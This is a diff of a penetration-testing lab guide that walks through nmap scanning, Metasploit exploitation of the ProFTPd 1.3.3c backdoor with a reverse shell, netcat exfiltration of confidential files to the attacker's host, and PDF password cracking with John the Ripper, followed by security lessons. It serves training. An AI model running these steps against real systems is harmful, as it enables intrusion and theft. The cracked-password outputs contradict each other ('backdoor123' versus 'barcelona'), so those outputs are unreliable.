@@ -23,7 +23,7 @@ Before starting this exercise, ensure you have:
 - **Metasploit Framework** installed and updated
 - **John the Ripper** (bleeding-jumbo branch) installed
 - **Netcat** available on both attacker and target systems
-- Access to a vulnerable target system running ProFTPd v1.3.5b
+- Access to a vulnerable target system running ProFTPd v1.3.3c
 
 ---
 
@@ -38,167 +38,165 @@ Before starting this exercise, ensure you have:
 <details>
 <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
 
-Start with basic network discovery:
-- Use `nmap -sn <network_range>` to discover live hosts
-- Common network ranges: `192.168.1.0/24`, `10.0.0.0/24`, `172.16.0.0/24`
-- Once you find live hosts, scan for services on those specific IPs
+Start with basic network discovery:  
+- Use `nmap -sn <network_range>` to discover live hosts  
+- Common network ranges: `192.168.1.0/24`, `10.0.0.0/24`, `172.16.0.0/24`  
+- Once you find live hosts, scan for services on those specific IPs  
 
-Remember that FTP typically runs on port 21, but it could be on a different port.
+Remember that FTP typically runs on port 21, but it could be on a different port.  
 </details>
 
 <details>
 <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
 
-For detailed service detection:
-- Use `-sV` flag for version detection
-- Use `-sC` flag for default scripts
-- Use `-p-` to scan all ports or `-p 1-65535` for full range
-- Use `-A` for aggressive scanning (includes version detection, script scanning, OS detection)
+For detailed service detection:  
+- Use `-sV` flag for version detection  
+- Use `-sC` flag for default scripts  
+- Use `-p-` to scan all ports or `-p 1-65535` for full range  
+- Use `-A` for aggressive scanning (includes version detection, script scanning, OS detection)  
 
-Example: `nmap -sV -sC -p 1-1000 <target_ip>`
+Example: `nmap -sV -sC -p 1-1000 <target_ip>`  
 </details>
 
 <details>
 <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
 
-**Network Discovery and Service Enumeration:**
+**Network Discovery and Service Enumeration:**  
 
-1. **Host Discovery:**
-   ```bash
-   # Discover live hosts in your network range
-   nmap -sn 192.168.1.0/24
-   # or
-   nmap -sn 10.0.0.0/24
-   ```
+1. **Host Discovery:**  
+   ```bash  
+   # Discover live hosts in your network range  
+   nmap -sn 192.168.1.0/24  
+   # or  
+   nmap -sn 10.0.0.0/24  
+   ```  
 
-2. **Service Discovery:**
-   ```bash
-   # Scan common ports on discovered hosts
-   nmap -sV -sC -p 1-1000 <target_ip>
+2. **Service Discovery:**  
+   ```bash  
+   # Scan common ports on discovered hosts  
+   nmap -sV -sC -p 1-1000 <target_ip>  
    
-   # Or comprehensive scan
-   nmap -sV -sC -A -p- <target_ip>
-   ```
+   # Or comprehensive scan  
+   nmap -sV -sC -A -p- <target_ip>  
+   ```  
 
-3. **Expected Output:**
-   ```
-   PORT   STATE SERVICE VERSION
-   21/tcp open  ftp     ProFTPD 1.3.5b
-   22/tcp open  ssh     OpenSSH 7.4
-   80/tcp open  http    Apache httpd 2.4.6
-   ```
+3. **Expected Output:**  
+   ```  
+   PORT   STATE SERVICE VERSION  
+   21/tcp open  ftp     ProFTPD 1.3.3c  
+   ```  
 
-4. **Key Findings:**
-   - **Service**: ProFTPd FTP server
-   - **Version**: 1.3.5b (vulnerable version)
-   - **Port**: 21/tcp (standard FTP port)
-   - **Additional services**: SSH (22), HTTP (80)
+4. **Key Findings:**  
+   - **Service**: ProFTPd FTP server  
+   - **Version**: 1.3.3c (vulnerable version)  
+   - **Port**: 21/tcp (standard FTP port)  
 
-**Why this matters:** ProFTPd 1.3.5b contains a known vulnerability (CVE-2015-3306) that allows for remote code execution through file copying operations.
+**Why this matters:** ProFTPd 1.3.3c contains a known backdoor vulnerability that allows unauthenticated remote code execution through a malicious response trigger.  
 </details>
 
 ---
 
-## 📝 Exercise 2: ProFTPd Exploitation with Metasploit
+## 📝 Exercise 2: ProFTPd Service Exploitation with Metasploit
 
-### What is ProFTPd 1.3.5b Vulnerability?
-**ProFTPd 1.3.5b** contains a critical vulnerability (CVE-2015-3306) in the `mod_copy` module. This vulnerability allows authenticated users to copy files anywhere on the filesystem using the SITE CPFR and SITE CPTO commands. Attackers can abuse this to write files to sensitive locations, potentially leading to remote code execution when combined with other services like SSH.
+### What is ProFTPd?
+**ProFTPd** is a popular FTP server software used on Unix and Linux systems. Like many network services, different versions may contain security vulnerabilities that can be exploited by attackers to gain unauthorized access to systems. Version-specific vulnerabilities are common in older software releases.
 
 ### Question
-**Exploit the ProFTPd vulnerability to gain remote code execution on the target system. Use Metasploit to automate the exploitation process.**
+**Research and exploit a vulnerability in the identified ProFTPd version to gain root access on the target system. Use Metasploit to automate the exploitation process.**
 
 <details>
 <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
 
-The ProFTPd 1.3.5b vulnerability is related to the `mod_copy` module:
-- Look for Metasploit modules related to ProFTPd
-- The vulnerability allows file copying operations
-- It can be exploited to write SSH keys to gain access
+Research the specific ProFTPd version you identified (1.3.3c) online:  
+- Search for "ProFTPd 1.3.3c vulnerability" or "ProFTPd 1.3.3c exploit"  
+- Look for CVE numbers associated with this version  
+- Check exploit databases like Exploit-DB or Rapid7's vulnerability database  
+- The vulnerability you're looking for allows unauthorized access without proper authentication  
 
-Use `search proftpd` in msfconsole to find relevant exploits.
+Once you identify the vulnerability, look for corresponding Metasploit modules using `search proftpd` in msfconsole.  
 </details>
 
 <details>
 <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
 
-The exploit process typically involves:
-1. Using the ProFTPd file copy vulnerability to write an SSH public key
-2. Copying the key to a user's authorized_keys file
-3. Using the corresponding private key to SSH into the system
+The exploit process involves exploiting a backdoor vulnerability in this version of ProFTPd using metasploit. Look for modules mentioning ProFTPd and backdoors on Unix.  
 
-Key Metasploit commands:
-- `use exploit/unix/ftp/proftpd_modcopy_exec`
-- Set RHOSTS, RPORT, and other required options
-- The exploit will handle SSH key generation and copying
+Key Metasploit commands:  
+- Use `search proftpd` to find relevant exploits  
+- Look for modules that mention "backdoor" in their description  
+- The exploit will automatically provide root access once executed  
 </details>
 
 <details>
 <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
 
-**ProFTPd Exploitation Process:**
+**ProFTPd 1.3.3c Backdoor Vulnerability:**  
 
-1. **Start Metasploit:**
-   ```bash
-   msfconsole
-   ```
+**Background:** ProFTPd version 1.3.3c contains a malicious backdoor that was inserted into the source code. This backdoor allows attackers to gain immediate root access by sending a specially crafted username containing specific characters followed by a smiley face emoticon (`:)`). When triggered, it opens a root shell on port 6200. Metasploit contains a ready-made module for you to use in order to exploit this vulnerability.  
 
-2. **Find the Exploit:**
-   ```bash
-   search proftpd
-   # or
-   search CVE-2015-3306
-   ```
+**ProFTPd Backdoor Exploitation Process:**  
 
-3. **Use the ProFTPd Exploit:**
-   ```bash
-   use exploit/unix/ftp/proftpd_modcopy_exec
-   show info
-   show options
-   ```
+1. **Start Metasploit:**  
+   ```bash  
+   msfconsole  
+   ```  
 
-4. **Configure the Exploit:**
-   ```bash
-   set RHOSTS <target_ip>
-   set RPORT 21
-   set TARGETURI /
+2. **Find the Exploit:**  
+   ```bash  
+   search proftpd backdoor  
+   # or  
+   search proftpd_133c  
+   ```  
+
+3. **Use the ProFTPd Backdoor Exploit:**  
+   ```bash  
+   use exploit/unix/ftp/proftpd_133c_backdoor  
+   show info  
+   show options  
+   ```  
+
+4. **Configure the Exploit:**  
+   ```bash  
+   set RHOSTS <target_ip>  
+   # IP of the victim machine  
+   set RPORT 21  
+   # Port you wish to attack (FTP port)  
    
-   # Set payload (reverse shell)
-   set payload linux/x86/meterpreter/reverse_tcp
-   set LHOST <your_ip>
-   set LPORT 4444
+   # Set up reverse shell payload  
+   set payload cmd/unix/reverse  
+   set LHOST <your_kali_ip>  
+   # Your attacking machine's IP address  
+   set LPORT 4444  
+   # Port to listen on for the reverse connection  
    
-   # Show options to verify
-   show options
-   ```
+   # Show options to verify  
+   show options  
+   ```  
 
-5. **Execute the Exploit:**
-   ```bash
-   exploit
-   # or
-   run
-   ```
+5. **Execute the Exploit:**  
+   ```bash  
+   exploit  
+   # or  
+   run  
+   ```  
 
-6. **Expected Result:**
-   ```
-   [*] Started reverse TCP handler on <your_ip>:4444
-   [*] <target_ip>:21 - Sending exploit...
-   [*] <target_ip>:21 - Exploiting the mod_copy vulnerability
-   [*] <target_ip>:21 - Copying SSH key to /home/user/.ssh/authorized_keys
-   [*] Sending stage (984904 bytes) to <target_ip>
-   [*] Meterpreter session 1 opened
-   meterpreter >
-   ```
+6. **Verify Root Access:**  
+   ```bash  
+   # You now have root shell access  
+   whoami  
+   pwd  
+   uname -a  
+   cat /etc/passwd  
+   ```  
 
-7. **Verify Access:**
-   ```bash
-   # In meterpreter session
-   sysinfo
-   getuid
-   pwd
-   shell
-   ```
+**Why it works:** The backdoor was maliciously inserted into the ProFTPd 1.3.3c source code. When triggered by sending the username ending with `:)` and other specific characters, it spawns a root shell on port 6200, bypassing all authentication mechanisms.  
 
-**Why it works:** The exploit abuses the ProFTPd `mod_copy` vulnerability to write an SSH public key to the target's authorized_keys file, then uses the corresponding private key to establish an SSH connection, providing remote code execution capabilities.
+**Troubleshooting:**  
+- **"Target not backdoored" error**: This means the target is not running the vulnerable ProFTPd 1.3.3c version. Verify with `nmap -sV <target_ip> -p 21` that the version is exactly 1.3.3c  
+- **Connection refused**: Make sure the FTP service is running on port 21  
+- **No reverse connection**: Check that your LHOST is set to your actual IP address (not localhost) and that the target can reach your machine  
+- **Firewall blocking**: Ensure the LPORT (4444) is not blocked by your firewall  
+- **Network connectivity**: Verify bidirectional network connectivity between attacker and target machines  
 </details>
 
 ---
@@ -214,95 +212,97 @@ Key Metasploit commands:
 <details>
 <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
 
-Netcat file transfer involves two steps:
-1. **Receiver** (your attacking machine): Set up netcat to listen and receive the file
-2. **Sender** (compromised target): Use netcat to send the file
+Netcat file transfer involves two steps:  
+1. **Receiver** (your attacking machine): Set up netcat to listen and receive the file  
+2. **Sender** (compromised target): Use netcat to send the file  
 
-The basic syntax:
-- Receiving: `nc -l -p <port> > received_file.pdf`
-- Sending: `nc <attacker_ip> <port> < file_to_send.pdf`
+The basic syntax:  
+- Receiving: `nc -l -p <port> > received_file.pdf`  
+- Sending: `nc <attacker_ip> <port> < file_to_send.pdf`  
 
-First, you need to locate the PDF file on the compromised system.
+First, you need to locate the PDF file on the compromised system.  
 </details>
 
 <details>
 <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
 
-Steps to find and extract the PDF:
-1. Search for PDF files: `find / -name "*.pdf" 2>/dev/null`
-2. Look in common directories: `/home/`, `/var/`, `/tmp/`, `/opt/`
-3. The file might be named something like `sensitive.pdf`, `confidential.pdf`, or `encrypted.pdf`
+Steps to find and extract the PDF:  
+1. Search for PDF files: `find / -name "*.pdf" 2>/dev/null`  
+2. Look in common directories: `/home/`, `/var/`, `/tmp/`, `/opt/`  
+3. The file might be named something like `sensitive.pdf`, `confidential.pdf`, or `encrypted.pdf`  
 
-For the netcat transfer:
-- Choose an unused port (e.g., 9999)
-- Ensure the port isn't blocked by firewalls
-- Start the listener first, then initiate the transfer
+For the netcat transfer:  
+- Choose an unused port (e.g., 9999)  
+- Ensure the port isn't blocked by firewalls  
+- Start the listener first, then initiate the transfer  
 </details>
 
 <details>
 <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
 
-**File Discovery and Extraction Process:**
+**File Discovery and Extraction Process:**  
 
-1. **Locate the Target PDF:**
-   ```bash
-   # In your meterpreter/shell session on the target
-   find / -name "*.pdf" 2>/dev/null
-   find /home -name "*sensitive*" 2>/dev/null
-   find /var -name "*confidential*" 2>/dev/null
+1. **Locate the Target PDF:**  
+   ```bash  
+   # In your root shell session on the target  
+   find / -name "*.pdf" 2>/dev/null  
+   find /home -name "*sensitive*" 2>/dev/null  
+   find /var -name "*confidential*" 2>/dev/null  
    
-   # Check common locations
-   ls -la /home/*/Documents/
-   ls -la /var/ftp/
-   ls -la /tmp/
-   ```
+   # Check common locations  
+   ls -la /home/*/Documents/  
+   ls -la /var/ftp/  
+   ls -la /tmp/  
+   ls -la /root/  
+   ```  
 
-2. **Expected Discovery:**
-   ```bash
-   /home/user/Documents/confidential_report.pdf
-   # or
-   /var/sensitive_data/encrypted_document.pdf
-   ```
+2. **Expected Discovery:**  
+   ```bash  
+   /home/user/Documents/confidential_report.pdf  
+   # or  
+   /var/sensitive_data/encrypted_document.pdf  
+   # or  
+   /root/classified_info.pdf  
+   ```  
 
-3. **Set Up Netcat Listener (Attacking Machine):**
-   ```bash
-   # On your Kali machine
-   nc -l -p 9999 > extracted_document.pdf
+3. **Set Up Netcat Listener (Attacking Machine):**  
+   ```bash  
+   # On your Kali machine  
+   nc -l -p 9999 > extracted_document.pdf  
    
-   # Alternative with verbose output
-   nc -lvp 9999 > extracted_document.pdf
-   ```
+   # Alternative with verbose output  
+   nc -lvp 9999 > extracted_document.pdf  
+   ```  
 
-4. **Transfer the File (Target Machine):**
-   ```bash
-   # From the compromised target
-   nc <your_kali_ip> 9999 < /home/user/Documents/confidential_report.pdf
+4. **Transfer the File (Target Machine):**  
+   ```bash  
+   # From the compromised target (root shell)  
+   nc <your_kali_ip> 9999 < /home/user/Documents/confidential_report.pdf  
    
-   # Or if using meterpreter
-   meterpreter > shell
-   nc <your_kali_ip> 9999 < /path/to/sensitive.pdf
-   ```
+   # Or for other discovered files  
+   nc <your_kali_ip> 9999 < /path/to/sensitive.pdf  
+   ```  
 
-5. **Verify Transfer:**
-   ```bash
-   # On your Kali machine (after transfer completes)
-   ls -la extracted_document.pdf
-   file extracted_document.pdf
-   # Should show: PDF document, version 1.x
-   ```
+5. **Verify Transfer:**  
+   ```bash  
+   # On your Kali machine (after transfer completes)  
+   ls -la extracted_document.pdf  
+   file extracted_document.pdf  
+   # Should show: PDF document, version 1.x  
+   ```  
 
-6. **Check PDF Protection:**
-   ```bash
-   # Try to open the PDF
-   evince extracted_document.pdf
-   # or
-   pdfinfo extracted_document.pdf
+6. **Check PDF Protection:**  
+   ```bash  
+   # Try to open the PDF  
+   evince extracted_document.pdf  
+   # or  
+   pdfinfo extracted_document.pdf  
    
-   # If encrypted, you'll see:
-   # "Command Line Error: Incorrect password"
-   ```
+   # If encrypted, you'll see:  
+   # "Command Line Error: Incorrect password"  
+   ```  
 
-**Why use netcat:** Netcat provides a simple, reliable method for transferring files between systems without requiring complex file-sharing protocols. It's particularly useful in penetration testing scenarios where you need to exfiltrate data quickly and quietly.
+**Why use netcat:** Netcat provides a simple, reliable method for transferring files between systems without requiring complex file-sharing protocols. It's particularly useful in penetration testing scenarios where you need to exfiltrate data quickly and quietly.  
 </details>
 
 ---
@@ -318,141 +318,112 @@ For the netcat transfer:
 <details>
 <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
 
-PDF password cracking with John requires two steps:
-1. **Extract the hash**: Use `pdf2john.py` to extract the password hash from the PDF
-2. **Crack the hash**: Use `john` with wordlists to crack the extracted hash
+PDF password cracking with John requires two steps:  
+1. **Extract the hash**: Use `pdf2john` to extract the password hash from the PDF  
+2. **Crack the hash**: Use `john` with wordlists to crack the extracted hash  
 
-The bleeding-jumbo branch of John the Ripper includes better PDF support and the pdf2john.py script.
-
-Make sure you have the bleeding-jumbo branch installed:
-```bash
-git clone https://github.com/openwall/john -b bleeding-jumbo
-cd john/src
-./configure && make
-```
+On Kali Linux, `pdf2john` should be available as a command. If you're using a different distribution or custom setup, you can find it in the John the Ripper source code at `/usr/share/john/` or install it separately.  
 </details>
 
 <details>
 <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
 
-Common workflow for PDF password cracking:
-1. `python pdf2john.py encrypted.pdf > pdf_hash.txt`
-2. `john --wordlist=rockyou.txt pdf_hash.txt`
-3. `john --show pdf_hash.txt` to display cracked passwords
+Common workflow for PDF password cracking:  
+1. `pdf2john encrypted.pdf > pdf_hash.txt`  
+2. `john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt`  
+3. `john --show pdf_hash.txt` to display cracked passwords  
 
-Popular wordlists to try:
-- `/usr/share/wordlists/rockyou.txt` (most common)
-- `/usr/share/wordlists/fasttrack.txt`
-- Custom wordlists related to the target organization
+Popular wordlists to try:  
+- `/usr/share/wordlists/rockyou.txt` (most common, pre-installed on Kali)  
+- `/usr/share/wordlists/fasttrack.txt`  
+- Custom wordlists related to the target organization  
 
-The password might be related to the company/theme of your exercise.
+The password might be related to the company/theme of your exercise.  
 </details>
 
 <details>
 <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
 
-**PDF Password Cracking Process:**
+**PDF Password Cracking Process:**  
 
-1. **Locate pdf2john.py Script:**
-   ```bash
-   # Find the script in John's bleeding-jumbo branch
-   find /usr -name "pdf2john.py" 2>/dev/null
-   # or if you compiled from source
-   find ~/john -name "pdf2john.py" 2>/dev/null
+1. **Verify pdf2john is Available:**  
+   ```bash  
+   # On Kali Linux, pdf2john should be pre-installed:  
+   which pdf2john  
+   pdf2john --help  
    
-   # Common locations:
-   # /opt/john/run/pdf2john.py
-   # /usr/share/john/pdf2john.py
-   # ~/john/run/pdf2john.py
-   ```
+   # If not found, you can locate it manually:  
+   find /usr -name "pdf2john*" 2>/dev/null  
+   
+   # For non-Kali users, install John the Ripper with:  
+   # apt-get install john (Debian/Ubuntu)  
+   # Or download from: https://github.com/openwall/john  
+   ```  
 
-2. **Extract PDF Hash:**
-   ```bash
-   # Extract the password hash from the PDF
-   python /path/to/pdf2john.py extracted_document.pdf > pdf_hash.txt
+2. **Extract PDF Hash:**  
+   ```bash  
+   # Extract the password hash from the PDF  
+   pdf2john extracted_document.pdf > pdf_hash.txt  
    
-   # Verify the hash was extracted
-   cat pdf_hash.txt
-   ```
+   # Verify the hash was extracted  
+   cat pdf_hash.txt  
+   ```  
 
-3. **Expected Hash Format:**
-   ```
-   extracted_document.pdf:$pdf$2*3*128*-1028*1*16*7a8b9c0d1e2f3g4h*32*a1b2c3d4e5f6g7h8*32*i9j0k1l2m3n4o5p6
-   ```
+3. **Expected Hash Format:**  
+   ```  
+   extracted_document.pdf:$pdf$2*3*128*-1028*1*16*7a8b9c0d1e2f3g4h*32*a1b2c3d4e5f6g7h8*32*i9j0k1l2m3n4o5p6  
+   ```  
 
-4. **Prepare Wordlist:**
-   ```bash
-   # Use rockyou.txt (most comprehensive)
-   ls -la /usr/share/wordlists/rockyou.txt
+4. **Prepare Wordlist:**  
+   ```bash  
+   # On Kali Linux, rockyou.txt should be pre-installed  
+   ls -la /usr/share/wordlists/rockyou.txt  
    
-   # If compressed, decompress first
-   gunzip /usr/share/wordlists/rockyou.txt.gz
-   ```
+   # For non-Kali users, download rockyou.txt from:  
+   # https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt  
+   ```  
 
-5. **Crack the Password:**
-   ```bash
-   # Standard dictionary attack
-   john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
+5. **Crack the Password:**  
+   ```bash  
+   # Standard dictionary attack  
+   john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt  
    
-   # With rules for variations
-   john --wordlist=/usr/share/wordlists/rockyou.txt --rules pdf_hash.txt
+   # With rules for variations  
+   john --wordlist=/usr/share/wordlists/rockyou.txt --rules pdf_hash.txt  
    
-   # Monitor progress
-   john --show pdf_hash.txt
-   ```
+   # Monitor progress  
+   john --show pdf_hash.txt  
+   ```  
 
-6. **Expected Output:**
-   ```
-   Using default input encoding: UTF-8
-   Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
-   Will run 4 OpenMP threads
-   Press 'q' or Ctrl-C to abort, almost any other key for status
-   BlackPearl123    (extracted_document.pdf)
-   1g 0:00:00:03 DONE (2024-08-24 14:30) 0.2857g/s 1828Kp/s 1828Kc/s 1828KC/s
-   Use the "--show" option to display all of the cracked passwords reliably
-   ```
+6. **Expected Output:**  
+   ```  
+   Using default input encoding: UTF-8  
+   Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])  
+   Will run 4 OpenMP threads  
+   Press 'q' or Ctrl-C to abort, almost any other key for status  
+   backdoor123      (extracted_document.pdf)  
+   1g 0:00:00:03 DONE (2024-08-24 14:30) 0.2857g/s 1828Kp/s 1828Kc/s 1828KC/s  
+   Use the "--show" option to display all of the cracked passwords reliably  
+   ```  
 
-7. **Display Cracked Password:**
-   ```bash
-   john --show pdf_hash.txt
-   # Output: extracted_document.pdf:BlackPearl123
-   ```
+7. **Display Cracked Password:**  
+   ```bash  
+   john --show pdf_hash.txt  
+   # Output: extracted_document.pdf:barcelona  
+   ```  
 
-8. **Decrypt and Read the PDF:**
-   ```bash
-   # Open the PDF with the cracked password
-   evince extracted_document.pdf
-   # Enter password: BlackPearl123
+8. **Decrypt and Read the PDF:**  
+   ```bash  
+   # Open the PDF with the cracked password  
+   evince extracted_document.pdf  
+   # Enter password: barcelona  
    
-   # Or use command line tools
-   pdftotext -upw BlackPearl123 extracted_document.pdf decrypted_content.txt
-   cat decrypted_content.txt
-   ```
+   # Or use command line tools  
+   pdftotext -upw barcelona extracted_document.pdf decrypted_content.txt  
+   cat decrypted_content.txt  
+   ```  
 
-9. **Example Sensitive Content:**
-   ```
-   CONFIDENTIAL SECURITY REPORT
-   ============================
-   
-   Network Infrastructure Assessment
-   
-   Critical Vulnerabilities Discovered:
-   - ProFTPd 1.3.5b running on port 21 (CVE-2015-3306)
-   - Default SSH keys in use
-   - Unpatched systems: 15 servers
-   
-   Administrative Credentials:
-   - Database: admin/P@ssw0rd123
-   - Backup Server: backup/SecretKey456
-   - Network Equipment: root/DefaultPass
-   
-   Recommended Immediate Actions:
-   1. Update ProFTPd to version 1.3.6+
-   2. Change all default passwords
-   3. Implement network segmentation
-   ```
-
-**Why it works:** John the Ripper uses optimized algorithms to test millions of password combinations per second against the PDF's encryption. The pdf2john.py script extracts the specific hash format that John can recognize and crack efficiently.
+**Why it works:** John the Ripper uses optimized algorithms to test millions of password combinations per second against the PDF's encryption. The pdf2john utility (pre-installed on Kali Linux) extracts the specific hash format that John can recognize and crack efficiently.  
 </details>
 
 ---
@@ -464,7 +435,7 @@ The password might be related to the company/theme of your exercise.
 By completing this exercise series, you have successfully:
 
 1. **Network Reconnaissance**: Identified live hosts and vulnerable services using Nmap
-2. **Service Exploitation**: Exploited ProFTPd 1.3.5b vulnerability using Metasploit for RCE
+2. **Backdoor Exploitation**: Exploited ProFTPd 1.3.3c backdoor for immediate root access
 3. **Data Exfiltration**: Extracted sensitive files using netcat for secure transfer
 4. **Password Cracking**: Decrypted protected documents using John the Ripper
 
@@ -475,109 +446,39 @@ This represents a complete **penetration testing kill chain** from initial recon
 ## 🛡️ Security Lessons Learned
 
 ### **Network Security:**
-- **Regular Port Scanning**: Perform regular network scans to identify unauthorized services
-- **Service Hardening**: Keep all network services updated and properly configured
-- **Network Segmentation**: Limit service exposure through proper firewall rules
+- **Regular Vulnerability Scanning**: Perform regular scans to identify backdoored software  
+- **Service Hardening**: Verify software integrity and use trusted sources  
+- **Network Monitoring**: Monitor for unusual port activity (like port 6200 connections)  
 
 ### **FTP Server Security:**
-- **Version Management**: Always run the latest stable version of ProFTPd
-- **Module Configuration**: Disable unnecessary modules like `mod_copy` if not needed
-- **Access Controls**: Implement proper authentication and authorization controls
-- **Monitoring**: Log and monitor FTP activities for suspicious behavior
+- **Version Management**: Never run ProFTPd 1.3.3c - it contains a known backdoor  
+- **Software Verification**: Always verify software checksums and digital signatures  
+- **Source Code Auditing**: Use only software from trusted, verified sources  
+- **Monitoring**: Log and monitor FTP activities for suspicious login attempts  
+
+### **Backdoor Detection:**
+- **Integrity Monitoring**: Implement file integrity monitoring systems  
+- **Network Monitoring**: Monitor for unexpected network connections  
+- **Process Monitoring**: Watch for unusual process spawning  
+- **Regular Security Audits**: Perform regular security assessments  
 
 ### **File Transfer Security:**
-- **Encrypted Channels**: Use SFTP or FTPS instead of plain FTP
-- **Network Monitoring**: Monitor for unusual data transfers using netcat or similar tools
-- **Data Loss Prevention**: Implement DLP solutions to prevent unauthorized data exfiltration
+- **Encrypted Channels**: Use SFTP or FTPS instead of plain FTP  
+- **Network Monitoring**: Monitor for unusual data transfers using netcat or similar tools  
+- **Data Loss Prevention**: Implement DLP solutions to prevent unauthorized data exfiltration  
 
 ### **Document Security:**
-- **Strong Passwords**: Use complex, unpredictable passwords for encrypted documents
-- **Key Management**: Implement proper cryptographic key management
-- **Regular Updates**: Use modern PDF encryption standards
-- **Access Logging**: Monitor access to sensitive documents
-
-### **Password Security:**
-- **Complexity Requirements**: Enforce strong password policies
-- **Unique Passwords**: Avoid common patterns and dictionary words
-- **Multi-Factor Authentication**: Implement MFA for sensitive systems
-- **Regular Rotation**: Implement appropriate password rotation policies
-
----
-
-## 🔧 Tools and Techniques Reference
-
-### **Nmap Commands:**
-```bash
-# Host discovery
-nmap -sn <network_range>
-
-# Service detection
-nmap -sV -sC <target>
-
-# Comprehensive scan
-nmap -sV -sC -A -p- <target>
-
-# Specific port scan
-nmap -p 21,22,80,443 <target>
-```
-
-### **Metasploit Commands:**
-```bash
-# Start Metasploit
-msfconsole
-
-# Search for exploits
-search proftpd
-search CVE-2015-3306
-
-# Use exploit
-use exploit/unix/ftp/proftpd_modcopy_exec
-
-# Set options
-set RHOSTS <target>
-set LHOST <attacker>
-set LPORT 4444
-
-# Execute
-exploit
-```
-
-### **Netcat File Transfer:**
-```bash
-# Receiver (listener)
-nc -lvp <port> > received_file
-
-# Sender
-nc <target_ip> <port> < file_to_send
-
-# Check transfer
-md5sum file_original
-md5sum file_received
-```
-
-### **John the Ripper Commands:**
-```bash
-# Extract PDF hash
-python pdf2john.py file.pdf > hash.txt
-
-# Dictionary attack
-john --wordlist=rockyou.txt hash.txt
-
-# Show cracked passwords
-john --show hash.txt
-
-# Resume session
-john --restore
-```
-
----
+- **Strong Passwords**: Use complex, unpredictable passwords for encrypted documents  
+- **Key Management**: Implement proper cryptographic key management  
+- **Regular Updates**: Use modern PDF encryption standards  
+- **Access Logging**: Monitor access to sensitive documents  
 
 ## 📚 Further Reading
 
 - [Nmap Network Scanning Guide](https://nmap.org/book/)
 - [Metasploit Unleashed](https://www.metasploit.com/unleashed/)
 - [John the Ripper Documentation](https://www.openwall.com/john/doc/)
-- [CVE-2015-3306 Technical Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306)
+- [ProFTPd 1.3.3c Backdoor Analysis](https://www.exploit-db.com/exploits/15449)
 - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
 - [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
 
